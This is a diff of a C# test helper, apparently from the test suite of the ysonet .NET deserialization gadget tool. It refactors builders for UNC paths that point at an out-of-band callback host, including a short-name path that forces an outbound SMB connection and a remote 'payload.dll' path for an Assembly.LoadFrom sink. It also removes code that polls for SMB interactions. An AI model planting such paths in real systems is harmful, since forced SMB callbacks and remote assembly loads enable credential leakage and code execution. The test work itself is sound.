@@ -183,37 +183,65 @@ namespace ysonet.Tests
             return label + "." + Domain;
         }
 
-        // A UNC path whose short-name component makes Windows expand it, which is what
-        // performs the outbound SMB connection. The component holding the "~" must be 12
-        // characters or fewer (MaxShortName in mscorlib's LongPathHelper), otherwise the
-        // expansion, and therefore the callback, never happens.
+        // The SHAPE names a row may ask for, and the one place that turns a shape plus a host
+        // into a path. It is static and takes a bare host so a row-table guard can build the
+        // same paths with no session and no network; the instance helpers below are what the
+        // tier itself calls. An UNKNOWN shape returns null rather than defaulting to one of
+        // these, because a typo that quietly became the short-name path would only surface as
+        // a missing callback on an --oob run, which is the hardest place to read it.
+        public static string UncPathForShape(string shape, string host)
+        {
+            switch (shape)
+            {
+                // The short-name component makes Windows expand the path, which is what
+                // performs the outbound SMB connection. The component holding the "~" must be
+                // 12 characters or fewer (MaxShortName in mscorlib's LongPathHelper),
+                // otherwise the expansion, and therefore the callback, never happens.
+                case "shortname": return "\\\\" + host + "\\share\\aaaaaa~1\\x";
+                // No short-name component: the control case, which must NOT cause any lookup,
+                // and the shape for a sink that opens the path it is given.
+                case "plain": return "\\\\" + host + "\\share\\file.txt";
+                // A DIRECTORY, for a gadget whose sink enumerates a folder rather than opening
+                // one file. Opening the directory resolves the host, so no short-name
+                // component is needed; there is no file component at all.
+                case "dir": return "\\\\" + host + "\\share\\plugins";
+                // A BARE host, with no share component at all, for a gadget that APPENDS its
+                // own component to -c before opening it. Path.Combine turns "\\host" into the
+                // valid share path "\\host\<appended>", so the open resolves the host; a path
+                // that already had a share would push the gadget's component a level deeper.
+                case "barehost": return "\\\\" + host;
+                // An assembly, for a gadget whose sink is Assembly.LoadFrom. No short-name
+                // component is needed here: the loader opens the file itself, so the host is
+                // resolved by the load attempt rather than by 8.3 expansion. The ".dll" tail
+                // matters - AssemblyInstallerLoad only accepts a loadable assembly extension.
+                case "dll": return "\\\\" + host + "\\share\\payload.dll";
+                default: return null;
+            }
+        }
+
         public string ShortNameUncPath(string label)
         {
-            return "\\\\" + HostFor(label) + "\\share\\aaaaaa~1\\x";
+            return UncPathForShape("shortname", HostFor(label));
         }
 
-        // A UNC path with no short-name component: the control case, which must NOT
-        // cause any lookup.
         public string PlainUncPath(string label)
         {
-            return "\\\\" + HostFor(label) + "\\share\\file.txt";
+            return UncPathForShape("plain", HostFor(label));
         }
 
-        // A UNC path to a DIRECTORY, for a gadget whose sink enumerates a folder rather than
-        // opening one file. Opening the directory resolves the host, so no short-name
-        // component is needed; there is no file component at all.
         public string UncDirPath(string label)
         {
-            return "\\\\" + HostFor(label) + "\\share\\plugins";
+            return UncPathForShape("dir", HostFor(label));
         }
 
-        // A UNC path to an assembly, for a gadget whose sink is Assembly.LoadFrom. No
-        // short-name component is needed here: the loader opens the file itself, so the
-        // host is resolved by the load attempt rather than by 8.3 expansion. The ".dll"
-        // tail matters - AssemblyInstallerLoad only accepts a loadable assembly extension.
+        public string BareHostUncPath(string label)
+        {
+            return UncPathForShape("barehost", HostFor(label));
+        }
+
         public string UncDllPath(string label)
         {
-            return "\\\\" + HostFor(label) + "\\share\\payload.dll";
+            return UncPathForShape("dll", HostFor(label));
         }
 
         // Wait until the server reports THIS EXACT protocol for this label.
@@ -284,69 +312,6 @@ namespace ysonet.Tests
                 ReadInteractionLines(out status);
                 return status;
             }
-        }
-
-        // ---- session-level (unlabeled) observation ------------------------------
-        //
-        // interactsh v1.3.1's SMB server writes an interaction with protocol "smb" and NO
-        // full-id, so ProtocolsFor can never find it: that method requires a label-bearing
-        // full-id. The only honest correlation left is positional - remember how many
-        // COMPLETE records the log held before the action, then look only at records after
-        // that point. Callers must serialize their actions and finish each wait before
-        // starting the next, or an earlier event can be attributed to a later row.
-
-        /// <summary>
-        /// How many complete JSONL records the log holds right now. A partial trailing
-        /// line (the client is mid-write) is deliberately not counted, so the cursor never
-        /// sits in the middle of a record.
-        /// </summary>
-        public int CaptureInteractionCursor()
-        {
-            InteractionReadStatus status;
-            List<string> lines = ReadInteractionLines(out status);
-            int complete = 0;
-            foreach (string line in lines)
-                if (IsCompleteRecord(line)) complete++;
-            return complete;
-        }
-
-        /// <summary>
-        /// Wait for a record with this exact protocol that arrived AFTER the cursor.
-        /// Used only for protocols the server does not label.
-        /// </summary>
-        public bool WaitForSessionProtocolAfter(int cursor, string protocol, int totalMs)
-        {
-            int waited = 0;
-            for (; ; )
-            {
-                if (SessionProtocolSeenAfter(cursor, protocol)) return true;
-                if (waited >= totalMs) return false;
-                System.Threading.Thread.Sleep(500);
-                waited += 500;
-            }
-        }
-
-        private bool SessionProtocolSeenAfter(int cursor, string protocol)
-        {
-            InteractionReadStatus status;
-            List<string> lines = ReadInteractionLines(out status);
-            int index = 0;
-            foreach (string line in lines)
-            {
-                if (!IsCompleteRecord(line)) continue;
-                index++;
-                if (index <= cursor) continue;
-                string proto = JsonString(line, "protocol");
-                if (proto != null && string.Equals(proto, protocol, StringComparison.OrdinalIgnoreCase))
-                    return true;
-            }
-            return false;
-        }
-
-        private static bool IsCompleteRecord(string line)
-        {
-            string t = line.Trim();
-            return t.Length > 1 && t[0] == '{' && t[t.Length - 1] == '}';
         }
 
         // ---- egress probing -----------------------------------------------------
